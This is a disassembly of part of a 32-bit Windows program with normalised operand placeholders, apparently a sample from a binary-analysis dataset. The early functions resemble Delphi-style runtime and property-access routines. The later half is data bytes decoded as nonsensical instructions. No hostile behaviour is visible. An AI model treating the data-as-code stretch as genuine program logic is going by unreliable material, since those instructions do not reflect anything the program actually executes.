push sub_410375
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_404c48
mov esi eax
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41037c
push rw-data
call LeaveCriticalSection
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp ebx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x110 ]
mov eax [ ebx ]
call sub_403078
lea edx [ ebp - 0x110 ]
lea eax [ ebp - 0x10 ]
call sub_4040dc
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
call sub_407b58
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] ebx
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
sub_4103ac
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41041b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410422
retn
call sub_40ff60
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov edx [ r-xdata ]
call sub_404e08
mov eax rw-data
mov ecx 0x15
mov edx [ r-xdata ]
call sub_4048f4
mov eax rw-data
call sub_403e78
mov eax rw-data
call sub_40e82c
sub_410424
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4104c5
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4104cc
retn
mov eax rw-data
call sub_40ff30
mov eax sub_40e52c
mov [ rw-data ] eax
mov eax sub_40e154
mov [ rw-data ] eax
mov edx sub_40e064
mov [ rw-data ] edx
mov [ rw-data ] eax
mov eax sub_40e82c
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40fc24
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40eb40
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40ee6c
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40f594
mov edx [ rw-data ]
mov [ edx ] eax
push rw-data
call InitializeCriticalSection
sub_4104d0
mov [ fs : esi ] 0xab
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ edi + edi * 8 - 0x399c0000 ] ch
inc esi
add [ ebp + 0x640000ff ] ch
mov [ esi ] 0xae
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ edi + 0x640000ff ] ch
mov [ esi ] 0x90
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ ecx + 0x640000ff ] dl
mov [ esi ] 0x92
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ ebx + 0x640000ff ] dl
mov [ esi ] 0x94
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ ebp + 0x640000ff ] dl
mov [ esi ] 0x96
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ edi + 0x640000ff ] dl
mov [ esi ] 0x98
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ ecx + 0x640000ff ] bl
mov [ esi ] 0x9a
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ ebx + 0x640000ff ] bl
mov [ esi ] 0x9c
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ ebp + 0x640000ff ] bl
mov [ esi ] 0x9e
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ edi + 0x640000ff ] bl
mov [ esi ] 0x80
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ ecx + 0x640000ff ] al
mov [ esi ] 0x82
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ ebx + 0x640000ff ] al
mov [ esi ] 0x84
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ ebp + 0x640000ff ] al
mov [ esi ] 0x86
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ edi + 0x640000ff ] al
mov [ esi ] 0x88
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ ecx + 0x640000ff ] cl
mov [ esi ] 0x8a
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ ebx + 0x640000ff ] cl
mov [ esi ] 0x8c
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_410605
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41060c
retn
sub_410650
push ebx
push esi
push edi
test edx edx
je r-xdata
or eax 0xffffffff
xor ecx ecx
mov cl [ eax + 0x1 ]
mov eax [ eax + ecx + 0xb ]
mov eax [ eax ]
mov cl [ eax + 0x1 ]
lea esi [ eax + ecx + 0xf ]
mov edi [ eax + ecx + 0x7 ]
xor eax eax
inc eax
lea esi [ ecx + esi + 0x1 ]
cmp eax edi
jle r-xdata
mov bl [ ecx + edx - 0x1 ]
xor bl [ ecx + esi ]
test bl 0xdf
jne r-xdata
mov cl [ esi ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
mov cl [ esi ]
dec ecx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_41069c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x1
jne r-xdata
mov eax ebx
call sub_410644
cmp [ eax + 0x1 ] 0x0
jge r-xdata
mov eax esi
call sub_407ec8
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_410650
mov edx [ rw-data ]
mov eax esi
call sub_407b58
test al al
je r-xdata
mov edx [ rw-data ]
mov eax esi
call sub_407b58
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
call sub_407ec8
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebx
retn
sub_410700
push ebx
push esi
push edi
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx edx
or edx edx
je r-xdata
xor ebx ebx
mov bl [ eax + 0x1 ]
lea esi [ eax + ebx + 0x2 ]
mov bl [ esi + 0xa ]
movzx edi [ esi + ebx + 0xb ]
test edi edi
je r-xdata
mov cl [ edx - 0x4 ]
mov ch [ edx ]
and ecx 0xdfff
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea eax [ esi + ebx + 0xd ]
mov eax [ eax ]
jmp r-xdata
mov bh 0x0
mov bh 0x0
dec edi
lea eax [ eax + ebx + 0x1b ]
jne r-xdata
mov ch [ edx ]
and ch 0xdf
mov bl [ eax + 0x1a ]
jmp r-xdata
dec ebx
jne r-xdata
mov bx [ eax + 0x1a ]
and bh 0xdf
cmp ebx ecx
je r-xdata
mov ch [ ebx + edx - 0x1 ]
xor ch [ eax + ebx + 0x1a ]
test ch 0xdf
jne r-xdata
sub_410770
push ebx
push edi
mov edi [ edx ]
mov edi [ edi ]
mov bl 0x4
cmp [ edi ] 0x7
je r-xdata
mov ecx [ edx + 0x4 ]
cmp [ edx + 0x7 ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
mov bl [ edi + ecx + 0x2 ]
call ecx
jmp r-xdata
ja r-xdata
cmp bl 0x4
jae r-xdata
and ecx 0xffffff
add ecx eax
mov al [ ecx ]
cmp bl 0x2
jb r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop edi
pop ebx
retn
cmp bl 0x2
jae r-xdata
mov ax [ ecx ]
cmp bl 0x4
jb r-xdata
movsx eax ax
je r-xdata
cmp bl 0x0
movsx eax al
je r-xdata
mov eax [ ecx ]
and eax 0xffff
and eax 0xff
pop edi
pop ebx
retn
sub_4107e4
push ebx
push esi
push edi
mov edi edx
mov esi [ edi ]
mov esi [ esi ]
mov bl 0x4
cmp [ esi ] 0x7
je r-xdata
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
xor ebx ebx
mov bl [ esi + 0x1 ]
mov bl [ esi + ebx + 0x2 ]
mov esi [ edi + 0x8 ]
cmp [ edi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add eax esi
mov [ eax ] cl
cmp bl 0x2
jb r-xdata
jb r-xdata
pop edi
pop esi
pop ebx
retn
mov [ eax ] cx
cmp bl 0x4
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
mov [ eax ] ecx
sub_410840
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add edi eax
mov eax [ esi ]
mov eax [ eax ]
mov esi ecx
xor ecx ecx
mov cl [ eax + 0x1 ]
mov cl [ eax + ecx + 0x2 ]
lodsb [ esi ]
cmp al cl
jb r-xdata
jb r-xdata
stosb [ edi ]
mov cl al
[ edi ] [ esi ]
pop edi
pop esi
retn
mov al cl
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_410894
push ebx
push esi
push edi
add esp 0xffffff00
mov edi ecx
mov esi edx
mov ebx eax
mov eax esp
mov edx edi
mov ecx 0xff
call sub_404114
mov ecx esp
mov edx esi
mov eax ebx
call sub_410840
add esp 0x100
pop edi
pop esi
pop ebx
retn
sub_4108dc
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_4108c8
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_41091c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_410964
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_4046a4
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_4109a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41096b
lea eax [ ebp - 0x4 ]
call sub_404558
retn
sub_410974
push ebx
mov ebx [ edx ]
mov ebx [ ebx ]
mov bl [ ebx ]
sub bl 0x5
je r-xdata
call sub_410894
pop ebx
retn
sub bl 0x5
je r-xdata
call sub_4108dc
pop ebx
retn
dec bl
je r-xdata
call sub_41091c
jmp r-xdata
pop ebx
retn
sub_4109a0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_410a66
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x5
je r-xdata
lea eax [ ebp - 0xc ]
mov edx edi
call sub_404100
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_410974
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410a6d
lea eax [ ebp - 0xc ]
call sub_403e78
retn
dec al
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax ebx
mov edx edi
call sub_404594
jmp r-xdata
mov [ ebp - 0x8 ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx edi
mov edx eax
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_410a74
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx [ esi + 0x8 ]
mov eax [ esi ]
mov eax [ eax ]
call sub_410644
mov al [ eax ]
mov edx ebx
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
cmp edx 0xfe000000
jne r-xdata
mov edx ebx
and edx 0xffffff
add edx edi
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x8 ] ebx
mov edx [ edi ]
movsx ecx bx
add edx ecx
mov edx [ edx ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
jmp [ eax * 4 + jump_table_410abc ]
and eax 0x7f
cmp eax 0x4
ja r-xdata
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x4 ] edi
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov ax [ ebp + 0x10 ]
mov [ edx + 0x8 ] ax
jmp r-xdata
fld [ ebp + 0x8 ]
fistp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
fistp [ edx ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_410beb ]
jmp [ eax * 4 + jump_table_410b58 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
sub_410c80
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_410c6c
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_410cc0
push ebx
mov ebx [ edx + 0x8 ]
cmp [ edx + 0xb ] 0xfe
ja r-xdata
and ebx 0xffffff
add eax ebx
mov edx [ ecx ]
mov ebx [ ecx + 0x4 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
pop ebx
retn
mov edx [ edx + 0x10 ]
push [ ecx + 0x4 ]
push [ ecx ]
jb r-xdata
call ebx
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop ebx
retn
sub_410cf8
push ebp
mov ebp esp
cmp [ edx + 0xb ] 0xfe
mov ecx [ edx + 0x8 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
mov edx [ edx + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jb r-xdata
call ecx
jmp r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop ebp
retn 0x8
sub_410d34
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ecx [ edx + 0x8 ]
mov ebx ecx
and ebx 0xff000000
cmp ebx 0xff000000
jne r-xdata
cmp ebx 0xfe000000
jne r-xdata
mov ebx ecx
and ebx 0xffffff
add ebx eax
mov eax ebx
mov edx esi
call sub_4054cc
jmp r-xdata
mov [ esp ] ecx
mov ebx [ eax ]
movsx ecx cx
add ebx ecx
mov ecx [ ebx ]
mov [ esp ] ecx
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov ecx esi
mov edx eax
mov eax [ esp + 0x4 ]
call [ esp ]
mov edx esi
mov eax [ esp + 0x4 ]
call [ esp ]
jmp r-xdata
mov [ esp + 0x4 ] eax
mov eax [ edx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_410da8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_410dee
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410df5
retn
mov eax rw-data
call sub_403e78
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_4048f4
sub_410e00
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_410e25
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410e2c
retn
sub_410ffc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
adc [ ecx ] al
or al 0x0
add [ eax ] al
fsubr [ ebp + 0x40 ]
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc004110 ] ah
add [ eax ] al
add al bh
cmovno eax [ eax ]
jo r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
adc [ ecx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] dl
inc ecx
add [ eax + eax ] cl
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
push esp
adc [ ecx ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insd
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ ecx ] eax
or al 0x0
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edx + 0x41 ] bl
add [ eax + eax ] cl
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
or eax 0x72434645
popad
je r-xdata
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
add [ eax ] ecx
push es
push ebx
outsb
jb r-xdata
inc eax
add [ eax + 0x4110 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edx + 0xc0041 ] dh
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
or eax [ ebp + 0x46 ]
dec edi
jo r-xdata
add [ eax ] al
clc
cmovno eax [ eax ]
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
add [ eax ] bl
xor [ eax ] eax
or al 0x45
push ebx
je r-xdata
inc eax
add [ eax ] al
add ah dh
adc [ eax ] al
lea eax [ eax ]
inc esp
adc [ ecx ] al
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax - 0xc ] si
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edx ] cl
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
or eax [ ebp + 0x46 ]
add [ eax ] al
outsb
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0x11
inc ecx
add [ eax + eax ] cl
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edx + 0x41 ] ah
add [ eax + eax ] cl
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
or al [ ebp + 0x52 ]
popad
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ecx
add [ eax + eax ] cl
add [ eax ] al
push 0x70004111
xor eax [ eax ]
jl r-xdata
adc al [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x12
outsd
jb r-xdata
inc eax
add [ eax ] bl
xor [ eax ] eax
adc [ ebp + 0x46 ] al
imul ebp [ ebp + 0x53 ] 0x61657274
insd
inc ebp
jb r-xdata
add [ eax ] al
push esp
adc [ ecx ] al
jo r-xdata
rcr [ ecx + edx + 0x41 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
adc [ ecx ] eax
or al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edx + 0xc0041 ] bh
add [ eax ] al
push 0x70004111
xor eax [ eax ]
jl r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
or eax [ ebp + 0x57 ]
jb r-xdata
add [ eax ] al
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
adc [ ecx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx + 0x41 ] dh
inc eax
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
adc eax [ ecx ]
or al 0x0
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
push cs
inc ebp
inc ebx
insb
popad
jae r-xdata
add [ eax ] al
fsubr [ ebp + 0x40 ]
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
imul ebp [ ebp + 0x72 ] 0x6f727245
jb r-xdata
shl [ eax ] 0x40
add ah bl
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ ebx ] cl
inc ebp
inc esi
add [ eax ] al
push 0x70004111
xor eax [ eax ]
jl r-xdata
adc al [ fs : ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al [ fs : ecx ]
or al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
adc eax [ ecx ]
or al 0x0
add [ eax ] al
fsubr [ ebp + 0x40 ]
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
inc eax
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
or al [ ebp + 0x4c ]
imul esi [ ebx + 0x74 ] 0x6f727245
jb r-xdata
outsd
je r-xdata
add [ eax ] al
dec esi
outsd
je r-xdata
add [ eax ] al
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edx ] ah
inc ecx
add [ eax + eax ] cl
add [ eax ] al
fsubr [ ebp + 0x40 ]
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
or al [ ebp + 0x42 ]
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
or al 0x45
push edx
jae r-xdata
int3
add al al
xor [ eax ] al
outsd
jne r-xdata
xor eax [ eax ]
test [ ebx ] dh
inc eax
add [ eax + 0x33 ] bh
add [ eax + eax ] cl
add [ eax ] al
fsubr [ ebp + 0x40 ]
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
inc ecx
xor [ eax ] al
outsd
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ ebx ] dl
inc ecx
add [ eax + eax ] cl
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edx + 0xc0041 ] al
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
adc [ ebp + 0x53 ] al
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
lea eax [ eax ]
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
nop
sbb [ ebx ] dl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
adc al [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0xc004112
add [ eax ] al
add [ eax + 0x11 ] ch
inc ecx
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
adc al 0x41
add [ eax ] dl
add [ eax ] al
add [ eax + 0x7000406e ] ah
xor eax [ eax ]
jl r-xdata
inc eax
add al al
